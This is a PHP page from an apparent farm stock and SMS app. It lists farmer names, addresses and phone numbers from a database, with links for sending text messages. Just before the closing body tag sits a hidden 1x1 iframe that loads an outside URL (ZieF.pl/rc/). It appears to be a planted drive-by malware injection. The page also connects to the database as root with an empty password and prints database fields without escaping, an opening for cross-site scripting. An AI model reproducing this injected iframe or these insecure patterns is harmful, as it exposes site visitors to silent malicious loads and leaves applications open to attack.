<?php
ob_start();
//error_reporting(0);
?>
<?php
include('header.php');
?>
<body>

    <?php //include('navhead_user.php'); ?>

    <div class="container">
        <div class="row-fluid">
            <div class="span3">
                <div class="hero-unit-3">
                    <div class="alert-index alert-success">
                        <i class="icon-calendar icon-large"></i>
                        <?php
                        $Today = date('y:m:d');
                        $new = date('l, F d, Y', strtotime($Today));
                        echo $new;
                        ?>
                    </div>
                </div>
                <div class="hero-unit-1">
                <ul class="nav  nav-pills nav-stacked">
                    <ul class="nav  nav-pills nav-stacked">
                        <li class="nav-header">NAVIGATE</li>
                        <li   class="active">
                            <a href="main.php"><i class="icon-home icon-large"></i>&nbsp;Home
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a>

                        </li>
                        <li>
                            <a href="register_parent.php"><i class="icon-group icon-large"></i>&nbsp;FARMERS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="balance.php"><i class="icon-group icon-large"></i>&nbsp; BALANCE
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                </div>  
                            </a></li>  
                            </a></li> 
                            </a></li>
                </div>

            </div>
            <div class="span9">
               
                <br></br>
                <div class="hero-unit-3">
                    <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered" id="example">
                        <div class="alert alert-info">
                            <button type="button" class="close" data-dismiss="alert">&times;</button>
                            <strong><i class="icon-user icon-large"></i>&nbsp;FARMERS</strong>
                        </div>
         <center>

  <table border="1" class="table table-striped table-bordered">  
<tr>



<td>CUSTOMER / FARMER</td>
<td>ADDRESS</td>
<td>CONTACT </td>

<td>ACTION ONE</td>
<td>ACTION TWO</td>
<td>ACTION THREE</td>

</tr>

<?php




$con=mysql_connect("localhost","root","");
 if(!$con){
echo"connection failed".mysql_error();

}

$selectdb=mysql_select_db("stock",$con);

 if(!$selectdb){
echo"database selection failed".mysql_error();

}

$selectclans="select * from customer_details ";
$sql2=mysql_query($selectclans);

while($row=mysql_fetch_array($sql2)){
echo"<tr>";
//echo '<td>'.$row["id"].'</td>';

echo '<td>'.$row["customer_name"].'</td>';

//echo '<td>'.$row["sname"].'</td>';
echo '<td>'.$row["customer_address"].'</td>';

echo '<td>'.$row["customer_contact1"].'</td>';

?>

<td><a href="sendsms.php?tel=<?php echo $row['customer_contact1']; ?>">Send To This Contact</a></td>


<td><a href="sendsmsToAll.php?tel=<?php echo $row['customer_contact1']; ?>">Send To All</a></td>

<td><a href="selectClassToSendTo.php?class=<?php echo $row['customer_address']; ?>">Send To One Farmer</a></td>

<?php



}
?>

</tr>
</table>


</center>

                            </tr>
                        <?php //} ?>
                        </tbody>
                    </table>
                    <!-- end slider -->
                </div>
            </div>

        </div>
        <?php include('footer.php'); ?>
    </div>
</div>
</div>






<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>


